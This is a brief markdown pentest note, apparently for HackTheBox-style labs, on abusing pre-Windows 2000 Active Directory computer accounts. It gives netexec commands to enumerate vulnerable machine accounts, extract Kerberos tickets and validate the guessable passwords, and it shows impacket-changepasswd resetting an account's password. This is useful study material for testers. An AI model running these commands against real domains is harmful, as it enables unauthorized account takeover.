---
title: Pre2K
draft: false
tags:
---
 
Reference: https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers

Older Active Directory configurations allowed computer accounts to authenticate with:
```
username: COMPUTERNAME$  
password: COMPUTERNAME
```

Example:
```
DC01$  
password = dc01
```

Check AD hosts with pre2k:
```
$ sudo netexec ldap TARGET -u 'USER' -p 'PASSWORD' -M pre2k
```

This command will output the machine accounts within the AD environment that are vulnerable to pre2k. It will also extract kerberos tickets for the machine accounts.

To validate the credentials, we have to run:
```
netexec smb MS01.pirate.htb -u 'user$' -p 'password'
```

> [!Note]
> Try with combinations of mayusc and minusc until we receive the error `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` with netexec

This happens because some environments keep **“Pre-Windows 2000 Compatible Access”** enabled and the computer account password was never changed or was reset incorrectly.

We can now change the password with LDAP/kpassword/SMB/RPC (SMB and RPC will utilize SAMR protocol):
```bash
Example for MS01$ computer account user:

$ impacket-changepasswd 'DOMAIN_FQDN/MS01$'@TARGET -newpass 'Password@987' -p rpc-samr

Password:
ms01
```

